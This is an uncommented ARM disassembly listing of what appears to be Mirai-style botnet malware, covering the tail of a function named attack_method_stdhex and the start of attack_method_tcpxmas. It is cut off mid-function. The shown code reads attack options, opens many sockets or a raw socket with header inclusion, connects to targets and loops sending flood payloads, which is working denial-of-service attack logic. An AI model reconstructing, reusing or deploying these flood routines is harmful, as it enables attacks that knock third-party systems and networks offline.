    ddd0:	e3a02b01 	mov	r2, #1024	; 0x400
    ddd4:	eb0022bd 	bl	168d0 <__GI_memset>
    ddd8:	e1a01004 	mov	r1, r4
    dddc:	e3a02007 	mov	r2, #7
    dde0:	e1a03006 	mov	r3, r6
    dde4:	e1a00005 	mov	r0, r5
    dde8:	ebfff154 	bl	a340 <attack_get_opt_int>
    ddec:	e1a0c800 	lsl	ip, r0, #16
    ddf0:	e1a0c82c 	lsr	ip, ip, #16
    ddf4:	e1a01004 	mov	r1, r4
    ddf8:	e3a02006 	mov	r2, #6
    ddfc:	e1a03006 	mov	r3, r6
    de00:	e1a00005 	mov	r0, r5
    de04:	e58dc004 	str	ip, [sp, #4]
    de08:	ebfff14c 	bl	a340 <attack_get_opt_int>
    de0c:	e3a03e5b 	mov	r3, #1456	; 0x5b0
    de10:	e1a0b800 	lsl	fp, r0, #16
    de14:	e1a01004 	mov	r1, r4
    de18:	e2833004 	add	r3, r3, #4
    de1c:	e3a02000 	mov	r2, #0
    de20:	e1a00005 	mov	r0, r5
    de24:	ebfff145 	bl	a340 <attack_get_opt_int>
    de28:	e3a02001 	mov	r2, #1
    de2c:	e1a03002 	mov	r3, r2
    de30:	e1a0c800 	lsl	ip, r0, #16
    de34:	e1a01004 	mov	r1, r4
    de38:	e1a00005 	mov	r0, r5
    de3c:	e1a0a82c 	lsr	sl, ip, #16
    de40:	ebfff13e 	bl	a340 <attack_get_opt_int>
    de44:	e1a0482b 	lsr	r4, fp, #16
    de48:	e3a03000 	mov	r3, #0
    de4c:	e1540006 	cmp	r4, r6
    de50:	120420ff 	andne	r2, r4, #255	; 0xff
    de54:	e58d3034 	str	r3, [sp, #52]	; 0x34
    de58:	e58d3028 	str	r3, [sp, #40]	; 0x28
    de5c:	e58d302c 	str	r3, [sp, #44]	; 0x2c
    de60:	e58d3030 	str	r3, [sp, #48]	; 0x30
    de64:	11a03c2b 	lsrne	r3, fp, #24
    de68:	11832402 	orrne	r2, r3, r2, lsl #8
    de6c:	158d2008 	strne	r2, [sp, #8]
    de70:	1a000003 	bne	de84 <attack_method_stdhex+0xfc>
    de74:	eb0011df 	bl	125f8 <rand_next>
    de78:	e1a00800 	lsl	r0, r0, #16
    de7c:	e1a00820 	lsr	r0, r0, #16
    de80:	e58d0008 	str	r0, [sp, #8]
    de84:	e3570000 	cmp	r7, #0
    de88:	0a00004b 	beq	dfbc <attack_method_stdhex+0x234>
    de8c:	e3a05000 	mov	r5, #0
    de90:	e1a0b005 	mov	fp, r5
    de94:	e58d500c 	str	r5, [sp, #12]
    de98:	ea000024 	b	df30 <attack_method_stdhex+0x1a8>
    de9c:	e3a03000 	mov	r3, #0
    dea0:	e59dc008 	ldr	ip, [sp, #8]
    dea4:	e58d302c 	str	r3, [sp, #44]	; 0x2c
    dea8:	e3a03002 	mov	r3, #2
    deac:	e1cd32b8 	strh	r3, [sp, #40]	; 0x28
    deb0:	e1cdc2ba 	strh	ip, [sp, #42]	; 0x2a
    deb4:	eb00231f 	bl	16b38 <__GI_bind>
    deb8:	e5d63014 	ldrb	r3, [r6, #20]
    debc:	e353001f 	cmp	r3, #31
    dec0:	8a000010 	bhi	df08 <attack_method_stdhex+0x180>
    dec4:	e5964010 	ldr	r4, [r6, #16]
    dec8:	eb0011ca 	bl	125f8 <rand_next>
    decc:	e20418ff 	and	r1, r4, #16711680	; 0xff0000
    ded0:	e1a02c24 	lsr	r2, r4, #24
    ded4:	e1822421 	orr	r2, r2, r1, lsr #8
    ded8:	e2043cff 	and	r3, r4, #65280	; 0xff00
    dedc:	e1822403 	orr	r2, r2, r3, lsl #8
    dee0:	e5d61014 	ldrb	r1, [r6, #20]
    dee4:	e1822c04 	orr	r2, r2, r4, lsl #24
    dee8:	e0822130 	add	r2, r2, r0, lsr r1
    deec:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    def0:	e1a03c22 	lsr	r3, r2, #24
    def4:	e1833420 	orr	r3, r3, r0, lsr #8
    def8:	e2021cff 	and	r1, r2, #65280	; 0xff00
    defc:	e1833401 	orr	r3, r3, r1, lsl #8
    df00:	e1833c02 	orr	r3, r3, r2, lsl #24
    df04:	e5863004 	str	r3, [r6, #4]
    df08:	e59d200c 	ldr	r2, [sp, #12]
    df0c:	e1a01006 	mov	r1, r6
    df10:	e7920008 	ldr	r0, [r2, r8]
    df14:	e3a02010 	mov	r2, #16
    df18:	eb002328 	bl	16bc0 <__libc_connect>
    df1c:	e59d300c 	ldr	r3, [sp, #12]
    df20:	e1550007 	cmp	r5, r7
    df24:	e2833004 	add	r3, r3, #4
    df28:	e58d300c 	str	r3, [sp, #12]
    df2c:	0a00005a 	beq	e09c <attack_method_stdhex+0x314>
    df30:	e3a04801 	mov	r4, #65536	; 0x10000
    df34:	e2444001 	sub	r4, r4, #1
    df38:	e3a01001 	mov	r1, #1
    df3c:	e1a00004 	mov	r0, r4
    df40:	eb002725 	bl	17bdc <calloc>
    df44:	e59d1004 	ldr	r1, [sp, #4]
    df48:	e20120ff 	and	r2, r1, #255	; 0xff
    df4c:	e1a03421 	lsr	r3, r1, #8
    df50:	e1833402 	orr	r3, r3, r2, lsl #8
    df54:	e59d2000 	ldr	r2, [sp]
    df58:	e59dc00c 	ldr	ip, [sp, #12]
    df5c:	e1510004 	cmp	r1, r4
    df60:	e082600b 	add	r6, r2, fp
    df64:	e78c0009 	str	r0, [ip, r9]
    df68:	11c630b2 	strhne	r3, [r6, #2]
    df6c:	1a000003 	bne	df80 <attack_method_stdhex+0x1f8>
    df70:	eb0011a0 	bl	125f8 <rand_next>
    df74:	e59d1000 	ldr	r1, [sp]
    df78:	e081600b 	add	r6, r1, fp
    df7c:	e1c600b2 	strh	r0, [r6, #2]
    df80:	e3a00002 	mov	r0, #2
    df84:	e1a01000 	mov	r1, r0
    df88:	e3a02000 	mov	r2, #0
    df8c:	eb002430 	bl	17054 <__GI_socket>
    df90:	e59dc00c 	ldr	ip, [sp, #12]
    df94:	e3700001 	cmn	r0, #1
    df98:	e2855001 	add	r5, r5, #1
    df9c:	e28bb018 	add	fp, fp, #24
    dfa0:	e28d1028 	add	r1, sp, #40	; 0x28
    dfa4:	e3a02010 	mov	r2, #16
    dfa8:	e78c0008 	str	r0, [ip, r8]
    dfac:	1affffba 	bne	de9c <attack_method_stdhex+0x114>
    dfb0:	e28dd03c 	add	sp, sp, #60	; 0x3c
    dfb4:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    dfb8:	e12fff1e 	bx	lr
    dfbc:	e1a05007 	mov	r5, r7
    dfc0:	e1a03007 	mov	r3, r7
    dfc4:	e7993003 	ldr	r3, [r9, r3]
    dfc8:	e59fc0d4 	ldr	ip, [pc, #212]	; e0a4 <attack_method_stdhex+0x31c>
    dfcc:	e59fb0d4 	ldr	fp, [pc, #212]	; e0a8 <attack_method_stdhex+0x320>
    dfd0:	e59f60d4 	ldr	r6, [pc, #212]	; e0ac <attack_method_stdhex+0x324>
    dfd4:	e58d3024 	str	r3, [sp, #36]	; 0x24
    dfd8:	e58dc014 	str	ip, [sp, #20]
    dfdc:	e59f30cc 	ldr	r3, [pc, #204]	; e0b0 <attack_method_stdhex+0x328>
    dfe0:	e59fc0cc 	ldr	ip, [pc, #204]	; e0b4 <attack_method_stdhex+0x32c>
    dfe4:	e7991105 	ldr	r1, [r9, r5, lsl #2]
    dfe8:	e58db010 	str	fp, [sp, #16]
    dfec:	e58d3018 	str	r3, [sp, #24]
    dff0:	e58dc01c 	str	ip, [sp, #28]
    dff4:	e58d6020 	str	r6, [sp, #32]
    dff8:	e3a02002 	mov	r2, #2
    dffc:	e59f30a0 	ldr	r3, [pc, #160]	; e0a4 <attack_method_stdhex+0x31c>
    e000:	e2822001 	add	r2, r2, #1
    e004:	e58d3014 	str	r3, [sp, #20]
    e008:	e59fc0a0 	ldr	ip, [pc, #160]	; e0b0 <attack_method_stdhex+0x328>
    e00c:	e59f30a0 	ldr	r3, [pc, #160]	; e0b4 <attack_method_stdhex+0x32c>
    e010:	e3520031 	cmp	r2, #49	; 0x31
    e014:	e58db010 	str	fp, [sp, #16]
    e018:	e58dc018 	str	ip, [sp, #24]
    e01c:	e58d301c 	str	r3, [sp, #28]
    e020:	e58d6020 	str	r6, [sp, #32]
    e024:	e58d1024 	str	r1, [sp, #36]	; 0x24
    e028:	9afffff3 	bls	dffc <attack_method_stdhex+0x274>
    e02c:	eb0029ac 	bl	186e4 <rand>
    e030:	e59f3080 	ldr	r3, [pc, #128]	; e0b8 <attack_method_stdhex+0x330>
    e034:	e082c093 	umull	ip, r2, r3, r0
    e038:	e1a02122 	lsr	r2, r2, #2
    e03c:	e1a03182 	lsl	r3, r2, #3
    e040:	e0433082 	sub	r3, r3, r2, lsl #1
    e044:	e0630000 	rsb	r0, r3, r0
    e048:	e1a00100 	lsl	r0, r0, #2
    e04c:	e28d1038 	add	r1, sp, #56	; 0x38
    e050:	e0800001 	add	r0, r0, r1
    e054:	e3570000 	cmp	r7, #0
    e058:	e5104028 	ldr	r4, [r0, #-40]	; 0xffffffd8
    e05c:	0a00000b 	beq	e090 <attack_method_stdhex+0x308>
    e060:	e3a05000 	mov	r5, #0
    e064:	e7980105 	ldr	r0, [r8, r5, lsl #2]
    e068:	e1a0200a 	mov	r2, sl
    e06c:	e2855001 	add	r5, r5, #1
    e070:	e1a01004 	mov	r1, r4
    e074:	e3a03901 	mov	r3, #16384	; 0x4000
    e078:	eb002392 	bl	16ec8 <__libc_send>
    e07c:	e1550007 	cmp	r5, r7
    e080:	e3a02000 	mov	r2, #0
    e084:	1afffff6 	bne	e064 <attack_method_stdhex+0x2dc>
    e088:	e7991105 	ldr	r1, [r9, r5, lsl #2]
    e08c:	eaffffda 	b	dffc <attack_method_stdhex+0x274>
    e090:	e7991107 	ldr	r1, [r9, r7, lsl #2]
    e094:	e1a02007 	mov	r2, r7
    e098:	eaffffd7 	b	dffc <attack_method_stdhex+0x274>
    e09c:	e1a03105 	lsl	r3, r5, #2
    e0a0:	eaffffc7 	b	dfc4 <attack_method_stdhex+0x23c>
    e0a4:	0001f0e4 	.word	0x0001f0e4
    e0a8:	0001efe0 	.word	0x0001efe0
    e0ac:	0001f23c 	.word	0x0001f23c
    e0b0:	0001f178 	.word	0x0001f178
    e0b4:	0001f1b4 	.word	0x0001f1b4
    e0b8:	aaaaaaab 	.word	0xaaaaaaab

0000e0bc <attack_method_tcpxmas>:
    e0bc:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    e0c0:	e24ddf5b 	sub	sp, sp, #364	; 0x16c
    e0c4:	e58d1008 	str	r1, [sp, #8]
    e0c8:	e3a01010 	mov	r1, #16
    e0cc:	e1a04002 	mov	r4, r2
    e0d0:	e1a05003 	mov	r5, r3
    e0d4:	e1a06000 	mov	r6, r0
    e0d8:	eb0026bf 	bl	17bdc <calloc>
    e0dc:	e3a01004 	mov	r1, #4
    e0e0:	e58d000c 	str	r0, [sp, #12]
    e0e4:	e1a00006 	mov	r0, r6
    e0e8:	eb0026bb 	bl	17bdc <calloc>
    e0ec:	e1a01005 	mov	r1, r5
    e0f0:	e58d0010 	str	r0, [sp, #16]
    e0f4:	e3a02002 	mov	r2, #2
    e0f8:	e3a03000 	mov	r3, #0
    e0fc:	e1a00004 	mov	r0, r4
    e100:	ebfff08e 	bl	a340 <attack_get_opt_int>
    e104:	e3a03801 	mov	r3, #65536	; 0x10000
    e108:	e1a0c000 	mov	ip, r0
    e10c:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e110:	e2433001 	sub	r3, r3, #1
    e114:	e3a02003 	mov	r2, #3
    e118:	e1a01005 	mov	r1, r5
    e11c:	e1a00004 	mov	r0, r4
    e120:	e58dc014 	str	ip, [sp, #20]
    e124:	ebfff085 	bl	a340 <attack_get_opt_int>
    e128:	e1a01005 	mov	r1, r5
    e12c:	e3a02004 	mov	r2, #4
    e130:	e3a03040 	mov	r3, #64	; 0x40
    e134:	e1a07000 	mov	r7, r0
    e138:	e1a00004 	mov	r0, r4
    e13c:	ebfff07f 	bl	a340 <attack_get_opt_int>
    e140:	e1a0c000 	mov	ip, r0
    e144:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e148:	e1a01005 	mov	r1, r5
    e14c:	e3a02005 	mov	r2, #5
    e150:	e3a03001 	mov	r3, #1
    e154:	e1a00004 	mov	r0, r4
    e158:	e58dc018 	str	ip, [sp, #24]
    e15c:	ebfff077 	bl	a340 <attack_get_opt_int>
    e160:	e3a03801 	mov	r3, #65536	; 0x10000
    e164:	e1a0c000 	mov	ip, r0
    e168:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e16c:	e2433001 	sub	r3, r3, #1
    e170:	e1a01005 	mov	r1, r5
    e174:	e3a02007 	mov	r2, #7
    e178:	e1a00004 	mov	r0, r4
    e17c:	e58dc01c 	str	ip, [sp, #28]
    e180:	ebfff06e 	bl	a340 <attack_get_opt_int>
    e184:	e1a01005 	mov	r1, r5
    e188:	e1a0c800 	lsl	ip, r0, #16
    e18c:	e3a0200b 	mov	r2, #11
    e190:	e3a03001 	mov	r3, #1
    e194:	e1a00004 	mov	r0, r4
    e198:	e1a0a82c 	lsr	sl, ip, #16
    e19c:	ebfff067 	bl	a340 <attack_get_opt_int>
    e1a0:	e1a0c000 	mov	ip, r0
    e1a4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e1a8:	e1a01005 	mov	r1, r5
    e1ac:	e3a0200c 	mov	r2, #12
    e1b0:	e3a03001 	mov	r3, #1
    e1b4:	e1a00004 	mov	r0, r4
    e1b8:	e58dc020 	str	ip, [sp, #32]
    e1bc:	ebfff05f 	bl	a340 <attack_get_opt_int>
    e1c0:	e1a0c000 	mov	ip, r0
    e1c4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e1c8:	e1a01005 	mov	r1, r5
    e1cc:	e3a0200d 	mov	r2, #13
    e1d0:	e3a03001 	mov	r3, #1
    e1d4:	e1a00004 	mov	r0, r4
    e1d8:	e58dc024 	str	ip, [sp, #36]	; 0x24
    e1dc:	ebfff057 	bl	a340 <attack_get_opt_int>
    e1e0:	e1a0c000 	mov	ip, r0
    e1e4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e1e8:	e1a01005 	mov	r1, r5
    e1ec:	e3a0200e 	mov	r2, #14
    e1f0:	e3a03001 	mov	r3, #1
    e1f4:	e1a00004 	mov	r0, r4
    e1f8:	e58dc028 	str	ip, [sp, #40]	; 0x28
    e1fc:	ebfff04f 	bl	a340 <attack_get_opt_int>
    e200:	e1a0c000 	mov	ip, r0
    e204:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e208:	e1a01005 	mov	r1, r5
    e20c:	e3a0200f 	mov	r2, #15
    e210:	e3a03001 	mov	r3, #1
    e214:	e1a00004 	mov	r0, r4
    e218:	e58dc02c 	str	ip, [sp, #44]	; 0x2c
    e21c:	ebfff047 	bl	a340 <attack_get_opt_int>
    e220:	e1a0c000 	mov	ip, r0
    e224:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e228:	e1a01005 	mov	r1, r5
    e22c:	e3a02010 	mov	r2, #16
    e230:	e3a03001 	mov	r3, #1
    e234:	e1a00004 	mov	r0, r4
    e238:	e58dc030 	str	ip, [sp, #48]	; 0x30
    e23c:	ebfff03f 	bl	a340 <attack_get_opt_int>
    e240:	e1a0c000 	mov	ip, r0
    e244:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e248:	e3a02000 	mov	r2, #0
    e24c:	e3a03c03 	mov	r3, #768	; 0x300
    e250:	e1a01005 	mov	r1, r5
    e254:	e1a00004 	mov	r0, r4
    e258:	e58dc034 	str	ip, [sp, #52]	; 0x34
    e25c:	ebfff037 	bl	a340 <attack_get_opt_int>
    e260:	e3a02001 	mov	r2, #1
    e264:	e1a03002 	mov	r3, r2
    e268:	e58d0038 	str	r0, [sp, #56]	; 0x38
    e26c:	e1a01005 	mov	r1, r5
    e270:	e1a00004 	mov	r0, r4
    e274:	ebfff031 	bl	a340 <attack_get_opt_int>
    e278:	e1a03000 	mov	r3, r0
    e27c:	e20330ff 	and	r3, r3, #255	; 0xff
    e280:	e3a01003 	mov	r1, #3
    e284:	e3a00002 	mov	r0, #2
    e288:	e3a02006 	mov	r2, #6
    e28c:	e58d303c 	str	r3, [sp, #60]	; 0x3c
    e290:	eb00236f 	bl	17054 <__GI_socket>
    e294:	e3700001 	cmn	r0, #1
    e298:	e1a09000 	mov	r9, r0
    e29c:	0a000078 	beq	e484 <attack_method_tcpxmas+0x3c8>
    e2a0:	e28d3f5a 	add	r3, sp, #360	; 0x168
    e2a4:	e3a02001 	mov	r2, #1
    e2a8:	e5232004 	str	r2, [r3, #-4]!
    e2ac:	e3a0c004 	mov	ip, #4
    e2b0:	e3a01000 	mov	r1, #0
    e2b4:	e2822002 	add	r2, r2, #2
    e2b8:	e58dc000 	str	ip, [sp]
    e2bc:	eb002352 	bl	1700c <__GI_setsockopt>
    e2c0:	e3700001 	cmn	r0, #1
    e2c4:	0a00006c 	beq	e47c <attack_method_tcpxmas+0x3c0>
    e2c8:	e1a02807 	lsl	r2, r7, #16
    e2cc:	e3a03000 	mov	r3, #0
    e2d0:	e3560000 	cmp	r6, #0
    e2d4:	e58d3164 	str	r3, [sp, #356]	; 0x164
    e2d8:	e1a0b822 	lsr	fp, r2, #16
    e2dc:	0a000109 	beq	e708 <attack_method_tcpxmas+0x64c>
    e2e0:	e3a00002 	mov	r0, #2
    e2e4:	e3a01001 	mov	r1, #1
    e2e8:	e3a02000 	mov	r2, #0
